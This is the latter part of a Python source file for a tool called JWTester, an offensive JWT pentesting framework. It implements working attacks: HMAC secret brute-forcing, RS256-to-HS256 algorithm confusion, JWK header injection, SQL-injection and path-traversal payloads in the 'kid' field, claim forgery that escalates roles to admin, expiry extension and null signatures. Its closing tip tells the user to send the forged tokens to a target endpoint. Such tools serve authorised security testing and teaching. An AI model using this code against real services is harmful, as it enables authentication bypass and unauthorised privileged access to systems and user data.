            print(f"  {C.DIM}[*] Loaded {len(file_words)} words from {wordlist_file} (total: {len(words)}){C.RESET}")
        except Exception as ex:
            print(f"  {C.RED}[!] Could not load wordlist {wordlist_file}: {ex}{C.RESET}")

    words = list(dict.fromkeys(words))  # deduplicate, preserve order
    print(f"  {C.DIM}[*] Testing {len(words)} candidate secrets against {alg}...{C.RESET}")

    found  = [None]
    lock   = threading.Lock()
    stop   = threading.Event()
    count  = [0]
    start  = time.time()
    THREADS = 8

    def worker(chunk):
        for word in chunk:
            if stop.is_set(): return
            try:
                candidate = word.encode('utf-8', errors='replace') if isinstance(word, str) else word
                if jwt_verify_hmac(token, candidate):
                    with lock:
                        if found[0] is None:
                            found[0] = word
                            stop.set()
            except Exception:
                pass
            with lock:
                count[0] += 1

    chunk_size = max(1, len(words) // THREADS)
    threads = []
    for i in range(0, len(words), chunk_size):
        t = threading.Thread(target=worker, args=(words[i:i+chunk_size],), daemon=True)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    elapsed = time.time() - start
    rate    = int(count[0] / max(elapsed, 0.001))
    print(f"  {C.DIM}[*] Tested {count[0]} secrets in {elapsed:.2f}s ({rate}/s){C.RESET}")

    if found[0] is not None:
        print(f"\n  {C.GREEN}{C.BOLD}[!!!] SECRET CRACKED: {found[0]!r}{C.RESET}")
        print(f"  {C.DIM}Use --secret {found[0]!r} to forge signed tokens.{C.RESET}")
        return found[0]
    else:
        print(f"  {C.YELLOW}[-] Secret not found in wordlist.{C.RESET}")
        print(f"  {C.DIM}Tips:")
        print(f"    - Use --wordlist /usr/share/wordlists/rockyou.txt for larger list")
        print(f"    - Online: hashcat -a 0 -m 16500 <token> rockyou.txt")
        print(f"    - Online: john --format=HMAC-SHA256 --wordlist=rockyou.txt token.txt")
        print(f"    - jwt_tool: python3 jwt_tool.py <token> -C -d wordlist.txt{C.RESET}")
        return None

# ── A2: Algorithm Confusion RS256 -> HS256 ────────────────────────────────────
def attack_alg_confusion(header, payload, pubkey_pem):
    section("Algorithm Confusion RS256->HS256 [A2]")
    try:
        n, e = parse_pem_pubkey(pubkey_pem)
        print(f"  {C.DIM}[*] Parsed RSA public key ({n.bit_length()} bits){C.RESET}")
    except Exception as ex:
        print(f"  {C.RED}[!] Failed to parse public key PEM: {ex}{C.RESET}")
        print(f"  {C.DIM}Hint: Ensure PEM is SubjectPublicKeyInfo format (from openssl rsa -pubout){C.RESET}")
        return None

    # Raw DER bytes (strip PEM armor)
    lines    = pubkey_pem.strip().splitlines()
    b64_only = ''.join(l for l in lines if not l.startswith('---'))
    der_bytes = base64.b64decode(b64_only)
    pem_bytes = pubkey_pem.strip().encode()

    h = copy.deepcopy(header)
    h['alg'] = 'HS256'
    results = []

    experiments = [
        ("DER public key bytes as HMAC secret",  der_bytes),
        ("PEM public key string as HMAC secret", pem_bytes),
    ]

    for label, secret in experiments:
        token = jwt_build(h, payload, secret)
        results.append((label, secret, token))
        show_forged(label, token)

    print(f"\n  {C.DIM}Theory: if the server reads alg from the token header and uses its stored")
    print(f"  RSA public key as the HS256 HMAC secret, this forged token will verify.")
    print(f"  Reference: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/")
    print(f"  CVE: CVE-2016-5431 (node-jsonwebtoken), CVE-2022-21449 (Java){C.RESET}")
    return results

# ── A4: JWK Header Injection ──────────────────────────────────────────────────
def attack_jwk_inject(header, payload, bits=2048):
    section("JWK Header Injection [A4]")
    print(f"  {C.DIM}[*] Generating attacker RSA key for JWK injection...{C.RESET}")
    n, e, d, p, q = rsa_gen_keypair(bits)
    jwk_pub = rsa_to_jwk_pub(n, e)

    h = copy.deepcopy(header)
    h['alg'] = 'RS256'
    h['jwk'] = jwk_pub
    h.pop('kid', None)  # remove kid to avoid key lookup by kid

    token = jwt_build(h, payload, (d, n))
    show_forged("Self-signed RS256 with embedded attacker JWK", token)

    print(f"\n  {C.DIM}Theory: If the server uses the 'jwk' header field directly to verify the")
    print(f"  signature (without checking against a trusted key store), this token is valid.")
    print(f"  Reference: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection")
    print(f"  RFC 8725 explicitly warns against this: https://www.rfc-editor.org/rfc/rfc8725{C.RESET}")

    print(f"\n  {C.YELLOW}[*] Attacker public JWK (embedded in token):{C.RESET}")
    print(f"  {json.dumps(jwk_pub, indent=2)}")

    return token

# ── A5a: KID SQL Injection ─────────────────────────────────────────────────────
def attack_kid_sqli(header, payload, secret=b''):
    section("KID SQL Injection [A5a]")
    if not isinstance(secret, bytes):
        secret = str(secret).encode()
    secret_b64 = b64u_enc(secret)

    sqli_payloads = [
        # (kid_value, signing_secret, description)
        (f"' UNION SELECT '{secret_b64}'-- -",              secret,  "Generic SQL UNION (secret as b64url)"),
        (f"' UNION SELECT '{secret_b64}' FROM users-- -",   secret,  "MySQL/MariaDB UNION"),
        (f"' UNION SELECT '{secret_b64}'::text-- -",         secret,  "PostgreSQL UNION"),
        (f"' OR '1'='1",                                     b'',     "Boolean TRUE (sign with empty)"),
        (f"1 OR 1=1",                                        b'',     "Numeric TRUE bypass"),
        (f"'; SELECT pg_sleep(5)-- -",                       None,    "Time-based blind (PostgreSQL)"),
        (f"' AND 1=CONVERT(int,@@version)-- -",              None,    "MSSQL error-based"),
        (f"\\' UNION SELECT '{secret_b64}'-- -",             secret,  "Backslash-escaped quote"),
    ]

    results = []
    for kid_val, signing_secret, desc in sqli_payloads:
        h2 = copy.deepcopy(header)
        h2['kid'] = kid_val
        if signing_secret is not None:
            token = jwt_build(h2, payload, signing_secret if signing_secret else None)
            results.append((kid_val, token))
            print(f"\n  {C.YELLOW}kid = {kid_val!r}{C.RESET}")
            show_forged(desc, token)
        else:
            h2_str = b64u_enc(json.dumps(h2, separators=(',',':')).encode())
            p_str  = b64u_enc(json.dumps(payload, separators=(',',':')).encode())
            print(f"\n  {C.DIM}[probe] kid={kid_val!r} — {desc}")
            print(f"         Send: {h2_str}.{p_str}.any_sig (observe timing/errors){C.RESET}")

    print(f"\n  {C.DIM}How it works: If the server does SQL like")
    print(f'  "SELECT secret FROM keys WHERE id = \'" + kid + "\'"')
    print(f"  a UNION SELECT injects your value as the returned secret.")
    print(f"  Sign the forged token with that same secret to produce a valid signature.{C.RESET}")
    return results

# ── A5b: KID Path Traversal ────────────────────────────────────────────────────
def attack_kid_path(header, payload):
    section("KID Path Traversal [A5b]")
    path_payloads = [
        ("/dev/null",                               b'',     "Linux /dev/null — HMAC with empty string"),
        ("../../../../../../dev/null",              b'',     "Relative traversal to /dev/null"),
        ("../../../dev/null",                       b'',     "Shorter relative traversal"),
        ("/proc/sys/kernel/randomize_va_space",     b'2',    "ASLR file — value is likely '2'"),
        ("/proc/sys/kernel/hostname",               None,    "Hostname (know it? sign with it)"),
        ("../../etc/hostname",                      None,    "Relative path to hostname"),
        ("/etc/machine-id",                         None,    "Machine-id (32 hex chars, guessable)"),
        ("../../../../../../etc/machine-id",        None,    "Relative path to machine-id"),
        ("/proc/1/cmdline",                         None,    "PID 1 cmdline — may be predictable"),
        ("../../../../../../dev/urandom",           None,    "Problematic — random key each verify"),
        ("C:\\Windows\\win.ini",                    b'',     "Windows path traversal attempt"),
        ("....//....//....//dev/null",              b'',     "Filter bypass double-dot-slash"),
    ]

    results = []
    for path, signing_secret, desc in path_payloads:
        # Path traversal assumes server reads file as HMAC key — force HS256
        h2 = copy.deepcopy(header)
        h2['alg'] = 'HS256'
        h2['kid'] = path
        if signing_secret is not None:
            token = jwt_build(h2, payload, signing_secret if signing_secret else None)
            results.append((path, token))
            print(f"\n  {C.YELLOW}kid={path!r}  (sign with: {signing_secret!r}){C.RESET}")
            show_forged(desc, token)
        else:
            print(f"\n  {C.DIM}[probe] kid={path!r}")
            print(f"         {desc} — content needed to sign.{C.RESET}")

    print(f"\n  {C.DIM}Key insight: /dev/null returns empty string on read(), so HMAC(empty, data).")
    print(f"  /dev/null tokens are often accepted by implementations that use the file")
    print(f"  contents as the HMAC key without checking for empty-key edge cases.{C.RESET}")
    return results

# ── A7: Claim Manipulation ─────────────────────────────────────────────────────
def attack_forge_claims(header, payload, extra_claims_json, secret=None):
    section("Claim Manipulation / Privilege Escalation [A7]")
    p = copy.deepcopy(payload)

    if extra_claims_json:
        try:
            overrides = json.loads(extra_claims_json)
            p.update(overrides)
            print(f"  {C.DIM}[*] Applied custom claims: {overrides}{C.RESET}")
        except Exception as ex:
            print(f"  {C.RED}[!] --forge JSON parse error: {ex}{C.RESET}")

    # Auto-detect and escalate privilege claims
    auto_sets = []
    for k, v in list(p.items()):
        kl = k.lower()
        if kl == 'role' and str(v).lower() not in ('admin','administrator','superuser','root','superadmin'):
            auto_sets.append({k: 'admin'})
        if kl == 'roles' and isinstance(v, list):
            if not any(r.lower() in ('admin','administrator') for r in v):
                auto_sets.append({k: v + ['admin']})
        if kl in ('admin','isadmin','is_admin') and str(v).lower() in ('false','0','no','null','none','undefined'):
            auto_sets.append({k: True})
        if kl == 'sub' and str(v).lower() not in ('admin','administrator','root','0','1'):
            auto_sets.append({k: 'admin'})
        if kl in ('group','groups') and isinstance(v, list):
            if not any('admin' in str(r).lower() for r in v):
                auto_sets.append({k: v + ['admin']})
        if kl in ('scope','permissions') and isinstance(v, str):
            if 'admin' not in v.lower() and 'write' not in v.lower():
                auto_sets.append({k: v + ' admin:all write:all'})

    results = []
    if not extra_claims_json and not auto_sets:
        print(f"  {C.DIM}[*] No specific claims to forge provided — forging base payload.{C.RESET}")

    sig_note = f" (signed with {repr(secret) if secret else 'known secret'})" if secret else " (unsigned — needs --secret)"

    # Base custom payload
    token = jwt_build(header, p, secret.encode() if isinstance(secret,str) else secret)
    results.append(('custom', token))
    show_forged("Custom claim override" + sig_note, token)

    # Auto escalations
    for escalation in auto_sets:
        p2 = copy.deepcopy(p)
        p2.update(escalation)
        token2 = jwt_build(header, p2, secret.encode() if isinstance(secret,str) else secret)
        results.append((str(escalation), token2))
        show_forged(f"Auto privilege escalation: {escalation}" + sig_note, token2)

    if not secret:
        print(f"\n  {C.YELLOW}[!] No secret provided — tokens are unsigned (alg=none or base claims only).")
        print(f"  These may work on targets with broken signature verification.")
        print(f"  Use --secret <value> once you know the HMAC secret.{C.RESET}")
    return results

# ── A8: Expiry Bypass ─────────────────────────────────────────────────────────
def attack_expiry(header, payload, new_exp=None, secret=None):
    section("Expiry Bypass [A8]")
    p = copy.deepcopy(payload)
    target_exp = new_exp if new_exp else int(time.time()) + 86400 * 3650  # +10 years
    p['exp'] = target_exp
    if 'nbf' in p:
        p['nbf'] = int(time.time()) - 60  # set nbf to past
    exp_dt = datetime.datetime.utcfromtimestamp(target_exp).strftime('%Y-%m-%d %H:%M:%S')
    sec = secret.encode() if isinstance(secret, str) else secret
    token = jwt_build(header, p, sec)
    sig_note = f" (signed)" if secret else " (unsigned — needs --secret to be valid)"
    show_forged(f"Expiry extended to {exp_dt} UTC{sig_note}", token)
    if not secret:
        print(f"  {C.YELLOW}[!] Add --secret to produce a properly signed token.{C.RESET}")
    return token

# ── A9: Null/Empty Signature ──────────────────────────────────────────────────
def attack_null_sig(header, payload):
    section("Null / Empty Signature [A9]")
    h = b64u_enc(json.dumps(header, separators=(',', ':')).encode())
    p = b64u_enc(json.dumps(payload, separators=(',', ':')).encode())
    variants = [
        (f"{h}.{p}.",       "Empty signature (trailing dot)"),
        (f"{h}.{p}",        "No signature part (2-part JWT)"),
        (f"{h}.{p}.AA==",   "Minimal valid base64 padding"),
        (f"{h}.{p}.AA",     "Minimal base64 no padding"),
        (f"{h}.{p}.e30",    "Base64url of '{}'"),
        (f"{h}.{p}.IA",     "Base64url of ' ' (space)"),
    ]
    results = []
    for token, label in variants:
        results.append((label, token))
        show_forged(label, token)
    print(f"\n  {C.DIM}Some old JWT libraries (pre-2015) accepted empty/null signatures.")
    print(f"  Libraries affected: node-jsonwebtoken < 4.0.0, php-jwt < 5.0, ruby-jwt < 1.5.3{C.RESET}")
    return results

# ── A6: JKU/X5U Injection Guidance ───────────────────────────────────────────
def attack_jku_hint(header, payload):
    section("JKU / X5U URL Injection [A6/A10]")
    print(f"""
  {C.BOLD}Manual steps required (cannot be auto-exploited without a hosting endpoint):{C.RESET}

  {C.BOLD}Step 1{C.RESET} — Generate RSA keypair (run --jwk and save the printed JWK)

  {C.BOLD}Step 2{C.RESET} — Host a JWKS JSON at a URL you control:
  {{
    "keys": [
      {{
        "kty": "RSA",
        "n":   "<your n value>",
        "e":   "AQAB",
        "alg": "RS256",
        "use": "sig",
        "kid": "{header.get('kid', 'mykey')}"
      }}
    ]
  }}

  {C.BOLD}Step 3{C.RESET} — Forge header:
  {{ "alg": "RS256", "jku": "https://YOUR-SERVER/jwks.json", "kid": "{header.get('kid', 'mykey')}" }}

  {C.BOLD}Step 4{C.RESET} — Sign with matching RSA private key (python3 jwtester.py ... --jwk does this)

  {C.BOLD}Current values:{C.RESET}
    jku = {header.get('jku', '(not present)')}
    x5u = {header.get('x5u', '(not present)')}

  {C.DIM}References:
    https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
    https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwks-injection
    https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf{C.RESET}
""")

# ── Sign with known secret ────────────────────────────────────────────────────
def attack_sign_known(header, payload, secret_str):
    section(f"Forge with Known Secret [--secret]")
    alg = str(header.get('alg', 'HS256')).upper()
    h = copy.deepcopy(header)
    if not alg.startswith('HS'):
        print(f"  {C.YELLOW}[!] Original alg={alg}. Switching header to HS256 for HMAC signing.{C.RESET}")
        h['alg'] = 'HS256'
    sec = secret_str.encode() if isinstance(secret_str, str) else secret_str
    token = jwt_build(h, payload, sec)
    show_forged(f"Forged + signed with secret={secret_str!r}", token)
    return token

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    banner()

    ap = argparse.ArgumentParser(
        prog='jwtester.py',
        description='JWTester v2.0 — Advanced JWT Pentesting Framework (no dependencies)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              python3 jwtester.py token.txt                        Decode + scan
              python3 jwtester.py token.txt --all                  Run all attacks
              python3 jwtester.py token.txt --none                 None algorithm bypass
              python3 jwtester.py token.txt --crack                Brute-force HMAC secret
              python3 jwtester.py token.txt --crack --wordlist rockyou.txt
              python3 jwtester.py token.txt --secret "mysecret"    Forge with known secret
              python3 jwtester.py token.txt --pubkey pub.pem       RS256->HS256 confusion
              python3 jwtester.py token.txt --jwk                  JWK header injection
              python3 jwtester.py token.txt --kid-sqli             KID SQL injection
              python3 jwtester.py token.txt --kid-path             KID path traversal
              python3 jwtester.py token.txt --forge '{"admin":true,"role":"admin"}'
              python3 jwtester.py token.txt --expire 9999999999    Expiry bypass
              python3 jwtester.py token.txt --null-sig             Null signature variants
              python3 jwtester.py token.txt --all --secret found   All attacks + signing
              python3 jwtester.py token.txt --all --out results.txt
        """)
    )
    ap.add_argument('jwt_file',      help='File containing the JWT token (use - for stdin)')
    ap.add_argument('--all',         action='store_true', help='Run all attacks')
    ap.add_argument('--none',        action='store_true', help='None algorithm attack [A1]')
    ap.add_argument('--crack',       action='store_true', help='HMAC brute-force [A3]')
    ap.add_argument('--wordlist',    metavar='FILE',      help='Custom wordlist file for --crack')
    ap.add_argument('--secret',      metavar='SECRET',    help='Known HMAC secret for forging/verification')
    ap.add_argument('--pubkey',      metavar='PEM_FILE',  help='RSA public key PEM for confusion attack [A2]')
    ap.add_argument('--jwk',         action='store_true', help='JWK header injection with generated key [A4]')
    ap.add_argument('--kid-sqli',    action='store_true', help='KID SQL injection payloads [A5a]')
    ap.add_argument('--kid-path',    action='store_true', help='KID path traversal payloads [A5b]')
    ap.add_argument('--forge',       metavar='JSON',      help='JSON string of claims to override [A7]')
    ap.add_argument('--expire',      metavar='EPOCH_TS',  type=int, help='New exp timestamp [A8]')
    ap.add_argument('--null-sig',    action='store_true', help='Null/empty signature variants [A9]')
    ap.add_argument('--jku-hint',    action='store_true', help='Show JKU/X5U injection steps [A6]')
    ap.add_argument('--fetch-pubkey', action='store_true', help='Auto-fetch RSA public key from JWKS for confusion attack [A2]')
    ap.add_argument('--no-scan',     action='store_true', help='Skip vulnerability scan')
    ap.add_argument('--no-color',    action='store_true', help='Disable ANSI color output')
    ap.add_argument('--out',         metavar='OUTPUT_FILE', help='Save all forged tokens to file')

    args = ap.parse_args()

    if args.no_color:
        for attr in ['RED','GREEN','YELLOW','BLUE','MAGENTA','CYAN','WHITE','BOLD','DIM','RESET']:
            setattr(C, attr, '')

    # ── Read token ─────────────────────────────────────────────────────────────
    try:
        if args.jwt_file == '-':
            raw = sys.stdin.read().strip()
        else:
            with open(args.jwt_file, errors='replace') as f:
                raw = f.read().strip()
    except FileNotFoundError:
        print(f"{C.RED}[!] File not found: {args.jwt_file}{C.RESET}")
        sys.exit(1)
    except Exception as ex:
        print(f"{C.RED}[!] Error reading {args.jwt_file}: {ex}{C.RESET}")
        sys.exit(1)

    # Extract JWT(s) — handle one per line or token embedded in text
    candidates = []
    for line in raw.splitlines():
        line = line.strip()
        # Try to pull token from "Authorization: Bearer <token>" etc.
        m = re.search(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', line)
        if m:
            candidates.append(m.group(0))
        elif re.match(r'^eyJ', line):
            candidates.append(line)

    if not candidates:
        print(f"{C.RED}[!] No JWT found in {args.jwt_file}")
        print(f"    JWTs start with 'eyJ'. Ensure file contains a valid JWT.{C.RESET}")
        sys.exit(1)

    if len(candidates) > 1:
        print(f"{C.YELLOW}[*] Found {len(candidates)} JWT(s) — using the first one.{C.RESET}")
        print(f"    {C.DIM}{candidates[0][:60]}...{C.RESET}")

    token = candidates[0]

    # ── Parse ──────────────────────────────────────────────────────────────────
    try:
        header, payload, sig, parts = jwt_parse(token)
    except Exception as ex:
        print(f"{C.RED}[!] JWT parse error: {ex}{C.RESET}")
        sys.exit(1)

    # ── Always: Decode & Display ───────────────────────────────────────────────
    display_jwt(header, payload, sig, parts, token)

    # ── Always: Scan ───────────────────────────────────────────────────────────
    if not args.no_scan:
        findings = scan(header, payload, sig, parts)
        display_findings(findings)

    # ── Check if any attack flags set ──────────────────────────────────────────
    any_attack = any([
        args.all, args.none, args.crack, args.secret, args.pubkey,
        args.jwk, args.kid_sqli, args.kid_path, args.forge,
        args.expire is not None, args.null_sig, args.jku_hint, args.fetch_pubkey
    ])

    if not any_attack:
        print(f"\n{C.BOLD}{C.CYAN}  NEXT STEPS{C.RESET}")
        print(f"  {'─'*50}")
        print(f"  Run {C.BOLD}--all{C.RESET} to attempt all attacks automatically.")
        print(f"  Run {C.BOLD}--crack{C.RESET} to brute-force the HMAC secret.")
        print(f"  Run {C.BOLD}--none{C.RESET} for the none-algorithm bypass.")
        print(f"  Run {C.BOLD}--jwk{C.RESET} to generate + embed a forged RSA key.")
        print(f"  Run {C.BOLD}-h{C.RESET} for full usage and examples.\n")
        return

    forged_tokens = []
    secret_bytes  = args.secret.encode() if args.secret else None

    # ── Execute attacks ────────────────────────────────────────────────────────

    if args.secret:
        t = attack_sign_known(header, payload, args.secret)
        forged_tokens.append(('signed_known_secret', t))

    if args.none or args.all:
        results = attack_none(header, payload)
        forged_tokens.extend([(f"none_{v}", t) for v, t in results])

    if args.null_sig or args.all:
        results = attack_null_sig(header, payload)
        forged_tokens.extend([(f"null_sig_{l}", t) for l, t in results])

    if args.crack or args.all:
        found = attack_crack(token, header, payload, sig, wordlist_file=args.wordlist)
        if found and not args.secret:
            secret_bytes = found.encode() if isinstance(found, str) else found
            args.secret  = found
            print(f"  {C.DIM}[*] Cracked secret will be used for remaining forgeries.{C.RESET}")

    if args.fetch_pubkey or (args.all and str(header.get('alg','')).startswith('RS')):
        section("Auto-Fetch RSA Public Key [--fetch-pubkey]")
        issuer_info = fingerprint_issuer(payload)
        kid_val = header.get('kid','') if isinstance(header, dict) else ''
        if issuer_info:
            _, jwks_url = issuer_info
            print(f"  {C.DIM}[*] Fetching JWKS from: {jwks_url}{C.RESET}")
            keys = fetch_jwks_pubkey(jwks_url, kid=kid_val)
            if keys:
                for k_kid, n, e in keys:
                    print(f"  {C.GREEN}[+] Got RSA public key kid={k_kid!r} ({n.bit_length()} bits){C.RESET}")
                    # Build fake PEM for confusion attack
                    from_n_e_pem = f"  n={hex(n)}\n  e={e}"
                    print(f"  {C.DIM}Run confusion attack using fetched key as HMAC secret:{C.RESET}")
                    # Do the confusion attack inline with fetched key
                    h_conf = copy.deepcopy(header)
                    h_conf['alg'] = 'HS256'
                    # Use raw n bytes as HMAC secret (DER-like minimal)
                    n_bytes = n.to_bytes((n.bit_length()+7)//8, 'big')
                    e_bytes = e.to_bytes((e.bit_length()+7)//8, 'big')
                    for label, secret in [
                        ("HMAC(n_bytes)", n_bytes),
                        ("HMAC(e_bytes+n_bytes)", e_bytes + n_bytes),
                    ]:
                        t = jwt_build(h_conf, payload, secret)
                        show_forged(f"Confusion with fetched key — {label}", t)
                        forged_tokens.append((f"fetched_confusion_{label}", t))
            else:
                print(f"  {C.YELLOW}[-] Could not fetch keys from {jwks_url}{C.RESET}")
                print(f"  {C.DIM}Tip: Try manually: curl {jwks_url}{C.RESET}")
        else:
            print(f"  {C.YELLOW}[!] Unknown issuer — cannot auto-fetch JWKS. Use --pubkey instead.{C.RESET}")

    if args.pubkey:
        try:
            with open(args.pubkey, errors='replace') as f:
                pem_content = f.read()
            results = attack_alg_confusion(header, payload, pem_content)
            if results:
                forged_tokens.extend([(f"alg_confusion_{l}", t) for l, _, t in results])
        except Exception as ex:
            print(f"  {C.RED}[!] --pubkey error: {ex}{C.RESET}")

    if args.jwk or args.all:
        t = attack_jwk_inject(header, payload)
        forged_tokens.append(('jwk_injection', t))

    if args.kid_sqli or args.all:
        results = attack_kid_sqli(header, payload, secret_bytes or b'')
        forged_tokens.extend([(f"kid_sqli_{i}", t) for i, (_, t) in enumerate(results)])

    if args.kid_path or args.all:
        results = attack_kid_path(header, payload)
        forged_tokens.extend([(f"kid_path_{i}", t) for i, (_, t) in enumerate(results)])

    if args.forge or args.all:
        results = attack_forge_claims(header, payload, args.forge, args.secret)
        forged_tokens.extend([(f"forge_{i}", t) for i, (_, t) in enumerate(results)])

    if args.expire is not None or args.all:
        t = attack_expiry(header, payload, args.expire, args.secret)
        forged_tokens.append(('expiry_bypass', t))

    if args.jku_hint or args.all:
        attack_jku_hint(header, payload)

    # ── Summary ────────────────────────────────────────────────────────────────
    print(f"\n{C.BOLD}{'─'*72}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}  SUMMARY{C.RESET}")
    print(f"{C.BOLD}{'─'*72}{C.RESET}")
    print(f"  Original  : {C.DIM}{token[:90]}{'...' if len(token)>90 else ''}{C.RESET}")
    print(f"  Forged    : {C.BOLD}{C.GREEN}{len(forged_tokens)}{C.RESET} token(s) generated")
    if args.secret:
        print(f"  Secret    : {C.GREEN}{args.secret!r}{C.RESET}")

    if args.out:
        try:
            with open(args.out, 'w') as f:
                f.write(f"# JWTester v2.0 output — {datetime.datetime.utcnow().isoformat()}\n")
                f.write(f"# Original token\n{token}\n\n")
                for label, t in forged_tokens:
                    f.write(f"# {label}\n{t}\n\n")
            print(f"  Output    : {C.GREEN}Saved to {args.out}{C.RESET}")
        except Exception as ex:
            print(f"  {C.RED}[!] Could not write output file: {ex}{C.RESET}")

    print(f"\n  {C.DIM}Tip: Test each forged token against the target endpoint.")
    print(f"  Use Burp Suite Repeater or: curl -H 'Authorization: Bearer <token>' <url>{C.RESET}\n")


if __name__ == '__main__':
    main()
